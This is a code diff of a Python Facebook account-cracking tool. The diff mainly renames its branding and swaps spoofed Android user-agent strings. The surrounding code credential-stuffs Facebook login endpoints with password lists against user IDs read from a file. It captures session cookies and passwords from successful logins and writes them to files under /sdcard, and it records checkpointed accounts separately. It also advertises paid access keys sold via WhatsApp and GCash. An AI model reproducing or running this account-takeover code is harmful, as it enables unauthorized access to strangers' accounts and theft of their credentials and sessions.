@@ -193,7 +193,7 @@ import os,zlib
 from os import system as osRUB
 from os import system as cmd
 os.system('clear')
-print('         \x1b[38;5;46m WELCOME TO JAS WORLD          ')
+print('         \x1b[38;5;46m WELCOME TO Jas WORLD          ')
 
 
 try:
@@ -267,14 +267,14 @@ srange = 0
 saved = []
 totaldmp = 0
 filter = []
-sys.stdout.write('\x1b]2; Mr:JAS\x07')
+sys.stdout.write('\x1b]2; Jas\x07')
 S = '\033[1;37m'
 A = '\x1b[38;5;208m'
 R = '\x1b[38;5;46m'
 F = '\x1b[38;5;48m'
 Z = '\033[1;33m'
 head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
-folder_path = '/sdcard/MR:JAS'
+folder_path = '/sdcard/Jas'
 try:
     os.makedirs(folder_path, exist_ok=True)
 except:
@@ -295,11 +295,11 @@ $$\   $$ |  $$ |  $$ |  $$ |$$ |\$  /$$ |
  \______/ \______|\__|  \__|\__|     \__|       
 __________________________________________________
 
- \033[1;92m   ▁ ▂ ▃ ▅ ▆ ▇ █ \033[1;31mAUTHOR:MR:JAS\033[1;92m █ ▇ ▆ ▅ ▃ ▂ ▁                                                         
+ \033[1;92m   ▁ ▂ ▃ ▅ ▆ ▇ █ \033[1;31mAUTHOR:MR:Jas\033[1;92m █ ▇ ▆ ▅ ▃ ▂ ▁                                                         
 ──────────────────────────────────────────────────
-\033[1;92m Owner   :            MR:JAS
-\033[1;92m Facebook:            JASREL
-\033[1;92m Github  :            JASREL17
+\033[1;92m Owner   :            MR:Jas
+\033[1;92m Facebook:            JasREL
+\033[1;92m Github  :            JasREL17
 \033[1;92m Version :            0.1
 ──────────────────────────────────────────────────""")
 #__________________MAIN____________#
@@ -322,7 +322,7 @@ def result(OKs,cps):
         print(' \x1b[1;92m\x1b[1;91m\x1b[1;96m\x1b[0mThe Cloning Has Been Complete\x1b[1;96m\x1b[1;91m\x1b[1;92m\x1b[0m')
         print(' TOTAL OK: \x1b[1;92m%s' % str(len(oks)))
         print(' TOTAL CP: \x1b[1;96m%s' % str(len(cps)))
-        input("Press enter to back JAS Menu ")
+        input("Press enter to back Jas Menu ")
         exit()
 def menu():   
     os.system('clear')
@@ -347,7 +347,7 @@ def menu():
        # os.system('xdg-open https://wa.me/+8801310067277')
 #---------------------[ USER - AGENT ] -------------------#
 def uaxxx():
-    ua='[FBAN/FB4A;FBAV/90.0.0.15.70;FBBV/9876543;FBDM/{density=2.0,width=1080,height=1920};FBLC/en_US;FBRV/1234567;FBCR/Verizon;FBMF/Samsung Galaxy S20;FBBD/Samsung Galaxy S20;FBPN/com.facebook.katana;FBDV/SM-G981U;FBSV/11;FBOP/1;FBCA/arm64-v8a:armeabi-v7a;]'
+    ua='[FBAN/FB4A;FBAV/266.0.0.56.124;FBBV/209027753;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBRV/209644275;FBCR/Jio 4G;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
     return ua
 def method_crack():
     global methods
@@ -387,7 +387,7 @@ class main_crack():
     def crack(self,id):
         global methods
         clear()
-        print("\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\033[38;5;46m Put File  Example ● /sdcard/jaspogi.txt ")
+        print("\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\033[38;5;46m Put File  Example ● /sdcard/Jaspogi.txt ")
         self.file = input('\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\x1b[1;92m File Path ● ')
         try:
             self.id = open(self.file).read().splitlines()
@@ -404,7 +404,7 @@ class main_crack():
     def methodA(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mJAS-XD-M1\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
+            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mJas-XD-M1\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
             sys.stdout.flush()
             android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
             facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
@@ -420,7 +420,7 @@ class main_crack():
             fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
             ######m1#####
             sony = random.choice(['SonyXperia1','SonyXperia1II','SonyXperia5','SonyXperia5II','SonyXperia10','SonyXperia10II','SonyXperiaL4','SonyXperiaL3','SonyXperiaXZ3','SonyXperiaXZ2','SonyXperiaXZ2Compact','SonyXperiaXZ1','SonyXperiaXZPremium','SonyXperiaXA2','SonyXperiaXA1','SonyXperiaXCompact','SonyXperiaXZs','SonyXperiaXPerformance','SonyXperiaZ5','SonyXperiaZ3','SonyXperiaZ2','SonyXperiaM4Aqua','SonyXperiaE5','SonyXperiaE4','SonyXperiaC5Ultra','SonyXperiaZUltra','SonyXperiaZ1Compact','SonyXperiaZR','SonyXperiaZL','SonyXperiaSP','SonyXperiaT','SonyEricssonST25iv','SonyEricssonST25i','XperiaU'])
-            uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/412.0.0.22.115;FBPN/com.facebook.katana;FBLC/pt_BR;FBBV/468774204;FBCR/CLARO BR;FBMF/Xiaomi;FBBD/Redmi;FBDV/M1908C3JGG;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2216};FB_FW/1;FBRV/470765339;] FBBK/1'
+            uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/266.0.0.56.124;FBBV/209027753;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBRV/209644275;FBCR/Jio 4G;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;] FBBK/1'
             fs = name.split(' ')[0]
             try:
                 ls = name.split(' ')[1]
@@ -485,12 +485,12 @@ class main_crack():
                     
                     Elite(sid,ps,ckkk)
                     oks.append(sid)                 
-                    open('/sdcard/JAS/OK_ids_M1.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/SIAM/COOKiEs_M1.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
+                    open('/sdcard/Jas/OK_ids_M1.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/Jas/COOKiEs_M1.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                     print(f"\r\x1b[1;96m [JAS-CP] {sid} ● {ps} {S}")
+                     print(f"\r\x1b[1;96m [Jas-CP] {sid} ● {ps} {S}")
                      cps.append(sid)
-                     open('/sdcard/JAS/M1-CP.txt','a').write(sid+'●'+ps+'\n')
+                     open('/sdcard/Jas/M1-CP.txt','a').write(sid+'●'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -516,7 +516,7 @@ class main_crack():
             fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
             sony = random.choice(['SonyXperia1','SonyXperia1II','SonyXperia5','SonyXperia5II','SonyXperia10','SonyXperia10II','SonyXperiaL4','SonyXperiaL3','SonyXperiaXZ3','SonyXperiaXZ2','SonyXperiaXZ2Compact','SonyXperiaXZ1','SonyXperiaXZPremium','SonyXperiaXA2','SonyXperiaXA1','SonyXperiaXCompact','SonyXperiaXZs','SonyXperiaXPerformance','SonyXperiaZ5','SonyXperiaZ3','SonyXperiaZ2','SonyXperiaM4Aqua','SonyXperiaE5','SonyXperiaE4','SonyXperiaC5Ultra','SonyXperiaZUltra','SonyXperiaZ1Compact','SonyXperiaZR','SonyXperiaZL','SonyXperiaSP','SonyXperiaT','SonyEricssonST25iv','SonyEricssonST25i','XperiaU'])
             #######m3####
-            uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/412.0.0.22.115;FBPN/com.facebook.katana;FBLC/pt_BR;FBBV/468774204;FBCR/CLARO BR;FBMF/Xiaomi;FBBD/Redmi;FBDV/M1908C3JGG;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2216};FB_FW/1;FBRV/470765339;] FBBK/1'
+            uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/266.0.0.56.124;FBBV/209027753;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBRV/209644275;FBCR/Jio 4G;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;] FBBK/1'
             ######
             fs = name.split(' ')[0]
             try:
@@ -573,17 +573,17 @@ class main_crack():
 'Content-Length': str(len(content_lenght))}
                 q = session.post("https://api.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);JASb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SIAMb};{ckkk}"
-                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mJAS-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Jasb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SIAMb};{ckkk}"
+                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mJas-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
                     
                     Elite(sid,ps,ckkk)
                     oks.append(sid)
-                    open('/sdcard/JAS/OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/JAS/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
+                    open('/sdcard/Jas/OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Jas/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                    print(f"\r\x1b[1;96m [JAS-CP] {sid} ● {ps} {S}")
+                    print(f"\r\x1b[1;96m [Jas-CP] {sid} ● {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard/JAS/M2-CP.txt','a').write(sid+'●'+ps+'\n')
+                    open('/sdcard/Jas/M2-CP.txt','a').write(sid+'●'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -595,7 +595,7 @@ class main_crack():
     def methodB(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mJAS-XD-M3\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
+            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mJas-XD-M3\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
             sys.stdout.flush()
             android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
             facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
@@ -611,7 +611,7 @@ class main_crack():
             fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
             sony = random.choice(['SonyXperia1','SonyXperia1II','SonyXperia5','SonyXperia5II','SonyXperia10','SonyXperia10II','SonyXperiaL4','SonyXperiaL3','SonyXperiaXZ3','SonyXperiaXZ2','SonyXperiaXZ2Compact','SonyXperiaXZ1','SonyXperiaXZPremium','SonyXperiaXA2','SonyXperiaXA1','SonyXperiaXCompact','SonyXperiaXZs','SonyXperiaXPerformance','SonyXperiaZ5','SonyXperiaZ3','SonyXperiaZ2','SonyXperiaM4Aqua','SonyXperiaE5','SonyXperiaE4','SonyXperiaC5Ultra','SonyXperiaZUltra','SonyXperiaZ1Compact','SonyXperiaZR','SonyXperiaZL','SonyXperiaSP','SonyXperiaT','SonyEricssonST25iv','SonyEricssonST25i','XperiaU'])
             ####m2######
-            uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/72.0.0.1138;FBBV/6304476;[FBAN/Orca-Android;FBAV/424.0.0.25.113;FBPN/com.facebook.orca;FBLC/en_US;FBBV/510343531;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBDV/moto g play - 2023;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1439};FB_FW/1;]'
+            uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629372;FBDM/{density=3.0,width=1080,height=2192};FBLC/en_US;FBRV/210347457;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto z4;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
             fs = name.split(' ')[0]
             try:
                 ls = name.split(' ')[1]
@@ -667,17 +667,17 @@ class main_crack():
 'Content-Length': str(len(content_lenght))}
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);JASb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SIAMb};{ckkk}"
-                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mJAS-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Jasb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SIAMb};{ckkk}"
+                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mJas-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
                     
                     Elite(sid,ps,ckkk)
                     oks.append(sid)
-                    open('/sdcard//JAS/OK_ids_M3.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/JAS/COOKiEs_M3.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
+                    open('/sdcard//Jas/OK_ids_M3.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/Jas/COOKiEs_M3.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                    print(f"\r\x1b[1;96m [JAS-CP] {sid} ● {ps} {S}")
+                    print(f"\r\x1b[1;96m [Jas-CP] {sid} ● {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard/JAS/M3-CP.txt','a').write(sid+'●'+ps+'\n')
+                    open('/sdcard/Jas/M3-CP.txt','a').write(sid+'●'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -687,7 +687,7 @@ class main_crack():
     def methodD(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mJAS-XD-M4\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
+            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mJas-XD-M4\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
             sys.stdout.flush()
             android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
             facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
@@ -703,7 +703,7 @@ class main_crack():
             fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
             sony = random.choice(['SonyXperia1','SonyXperia1II','SonyXperia5','SonyXperia5II','SonyXperia10','SonyXperia10II','SonyXperiaL4','SonyXperiaL3','SonyXperiaXZ3','SonyXperiaXZ2','SonyXperiaXZ2Compact','SonyXperiaXZ1','SonyXperiaXZPremium','SonyXperiaXA2','SonyXperiaXA1','SonyXperiaXCompact','SonyXperiaXZs','SonyXperiaXPerformance','SonyXperiaZ5','SonyXperiaZ3','SonyXperiaZ2','SonyXperiaM4Aqua','SonyXperiaE5','SonyXperiaE4','SonyXperiaC5Ultra','SonyXperiaZUltra','SonyXperiaZ1Compact','SonyXperiaZR','SonyXperiaZL','SonyXperiaSP','SonyXperiaT','SonyEricssonST25iv','SonyEricssonST25i','XperiaU'])
             #####m4#####
-            uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/72.0.0.1138;FBBV/6304476;[FBAN/Orca-Android;FBAV/424.0.0.25.113;FBPN/com.facebook.orca;FBLC/en_US;FBBV/510343531;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBDV/moto g play - 2023;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1439};FB_FW/1;]'
+            uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629372;FBDM/{density=3.0,width=1080,height=2192};FBLC/en_US;FBRV/210347457;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto z4;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
             fs = name.split(' ')[0]
             try:
                 ls = name.split(' ')[1]
@@ -764,12 +764,12 @@ class main_crack():
                     
                     Elite(sid,ps,ckkk)
                     oks.append(sid)
-                    open('/sdcard/JAS/OK_ids_M4.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/JAS/COOKiEs_M4.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
+                    open('/sdcard/Jas/OK_ids_M4.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/Jas/COOKiEs_M4.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
                       #print(f"\r\x1b[1;96m [Fuck] {sid} | {ps} {S}")
                     #cps.append(sid)
-                    open('/sdcard//JAS/M4-CP.txt','a').write(sid+'●'+ps+'\n')
+                    open('/sdcard//Jas/M4-CP.txt','a').write(sid+'●'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -920,23 +920,23 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print('\033[1;32m[JAS-OK] '+cid+' | '+ps+'\033[0;97m')
+                print('\033[1;32m[Jas-OK] '+cid+' | '+ps+'\033[0;97m')
                 print('\n[‎‎🍪]\033[0;33m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m')
                 linex()
-                open('JAS-OK.txt', 'a').write(cid+' | '+ps+ '\n')
+                open('Jas-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:152]
-                print('\033[1;31m[JAS-CP] '+uid+' | '+ps+'\x1b[1;97m')
-                open('JAS-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                print('\033[1;31m[Jas-CP] '+uid+' | '+ps+'\x1b[1;97m')
+                open('Jas-CP.txt', 'a').write(uid+' | '+ps+'\n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[1;92m[JAS]\033[1;92m] %s|\33[1;31m[OK]:- %s \r'%(loop,len(oks))),
+        sys.stdout.write(f'\r\033[1;92m[Jas]\033[1;92m] %s|\33[1;31m[OK]:- %s \r'%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass 
@@ -948,7 +948,7 @@ def main_apv():
     os.system("clear")
     print(logo)
     uuid = str(os.geteuid())
-    Xyteee=('JASking1x6b7b5c%s85b8n9nfdi%s'%(uuid,uuid))
+    Xyteee=('Jasking1x6b7b5c%s85b8n9nfdi%s'%(uuid,uuid))
     print(logo)
     os.system("clear");print(logo)
     print(f" Your Key : \x1b[1;31m"+Xyteee)
@@ -964,7 +964,7 @@ def main_apv():
         else: 
             print('\033[1;92m Now it will work well in all countries')
             print('\033[1;92m-----------------------------------------------------\033[1;97m')
-            print('\033[1;92m[\033[1;92m•\033[1;92m]\033[1;92m Notes : JAS Tools Can buy in all countries!')
+            print('\033[1;92m[\033[1;92m•\033[1;92m]\033[1;92m Notes : Jas Tools Can buy in all countries!')
             print('\033[1;92m-----------------------------------------------------\033[1;97m')
             print('\033[1;92m [\033[1;92m1\033[1;92m]\033[1;92m 300 gcash \033[1;92mApproval For 1 month')
             print(' \033[1;92m[\033[1;92m2\033[1;92m]\033[1;92m 150 gcash \033[1;92mApproval For 15 days')
@@ -978,7 +978,7 @@ def main_apv():
             print("-----------------------------------------------------")
             url_wa = "https://api.whatsapp.com/send?phone=+639066969667&text="
             choice = input(" Enter your choice  : ")
-            tks = ("Hi sir JASREL, I Need To Buy Your JAS Tools Version 0.0.4 Premium Please Accept My Key To Premium\n\n Name : "+choice+"\n Key : "+Xyteee+"\n Buy Select : "+Picchi)
+            tks = ("Hi sir JasREL, I Need To Buy Your Jas Tools Version 0.0.4 Premium Please Accept My Key To Premium\n\n Name : "+choice+"\n Key : "+Xyteee+"\n Buy Select : "+Picchi)
             subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
             print('-----------------------------------------------------\n Run again with permission from admin')
             main_apv()
